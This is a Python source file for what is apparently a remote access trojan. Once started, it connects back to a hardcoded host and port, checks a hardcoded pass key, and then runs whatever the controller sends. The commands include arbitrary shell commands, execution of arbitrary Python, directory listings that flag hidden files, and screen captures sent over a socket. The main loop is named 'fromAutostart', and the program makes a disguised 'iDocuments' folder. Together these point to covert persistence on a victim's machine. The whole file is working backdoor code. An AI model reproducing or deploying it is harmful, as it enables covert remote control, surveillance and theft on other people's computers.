# -*- coding: utf-8 -*-
#!/usr/bin/python

import socket
import time
import os
import subprocess
import ctypes
import ImageGrab

HOST = '127.0.0.1'
PORT = 4434
active = False
printf = ''
hooked = {}
loggingState = False
passKey = r'1705a7f91b40320a19db18912b72148e'
tmpFolder = os.path.join(os.path.expanduser('~'), 'iDocuments')

if not os.path.exists(tmpFolder):
    os.makedirs(tmpFolder)

def Send(sock, cmd, end="[ENDOFMESSAGE]"):
    sock.sendall((cmd + end).encode('utf-8'))


def Receive(sock, end="[ENDOFMESSAGE]"):
    data = ""
    l = sock.recv(1024)
    while l:
        data = data + l
        if data.endswith(end):
            break
        else:
            l = sock.recv(1024)
    return data[:-len(end)].decode('utf-8')

def ScreenCast():
    print 'aq'
    ImageGrab.grab().save(os.path.join(tmpFolder, "tmp.jpg"), "JPEG")
    sc = socket.socket()
    sc.settimeout(None)
    print 'done initializing'
    while 1:
        try:
            sc.connect(("localhost",9999))
            print 'connected'
            f=open (os.path.join(tmpFolder, "tmp.jpg"), "rb")
            l = f.read(1024)
            while (l):
                sc.send(l)
                l = f.read(1024)
            sc.close()
            f.close()
            os.remove(os.path.join(tmpFolder, "tmp.jpg"))
            print 'done'
            break
        except Exception as e:
            print e
            continue



def Execute(source):
    try:
        exec source
        if printf == '':
            return 'No output<br>example: printf = "SOME TEXT OR VARIABLE"'
        return str(printf)
    except Exception as e:
        return str(e)


def Exec(cmde):
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
            return cmdoutput
        except Exception as e:
            return '<font color="red">SERVER ERROR: </font>' + str(e)

    else:
        return "Enter a command.\n"

def has_hidden_attribute(filepath):
    try:
        attrs = ctypes.windll.kernel32.GetFileAttributesW(unicode(filepath))
        assert attrs != -1
        result = bool(attrs & 2)
    except (AttributeError, AssertionError):
        result = False
    return result

def fromAutostart():
    global active
    global passKey
    passerror = False
    while True:
        try:
            if not passerror:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                except:
                    s.close()
                    active = False
                    time.sleep(10)
            data = Receive(s)
            if data == passKey:
                active = True
                Send(s, 'iamactive')

                while active:
                    data = Receive(s)
                    if data == '':
                        time.sleep(0.02)
                    if data == "terminate":
                        Send(s, "quitted")
                        active = False
                        break
                    elif data.startswith("cd "):
                        try:
                            os.chdir(data[3:])
                            stdoutput = ""
                        except:
                            stdoutput = "Error opening directory.\n"
                    elif data.startswith(("Activate")):
                        stdoutput = ''
                    elif data.startswith("runscript"):
                        stdoutput = Execute(data[10:])
                    elif data.startswith('startScreenCasting'):
                        ScreenCast()
                        stdoutput = 'started'
                    elif data.startswith("ls"):
                        string = {}
                        try:
                            for n, i in enumerate(os.listdir(u'.')):
                                string[n] = {}
                                string[n]['name'] = i
                                string[n]['type'] = os.path.isfile(i)
                                string[n]['size'] = os.path.getsize(i)
                                string[n]['modified'] = time.ctime(os.path.getmtime(i))
                                string[n]['hidden'] = has_hidden_attribute(i)
                            stdoutput = str(string)
                        except WindowsError:
                            stdoutput = 'Access is denied'
                    else:
                        stdoutput = Exec(data)
                    stdoutput = '<p align="center" style="color:lime; font-size: 12px; background-color:#194759;">' + os.getcwdu() + '</p>\n\n'+stdoutput
                    Send(s, stdoutput)
                if data == "terminate":
                    break
                time.sleep(3)
            else:
                Send(s, 'Access Denied')
                passerror = True
        except socket.error:
                s.close()
                active = False
                passerror = False
                time.sleep(10)


fromAutostart()
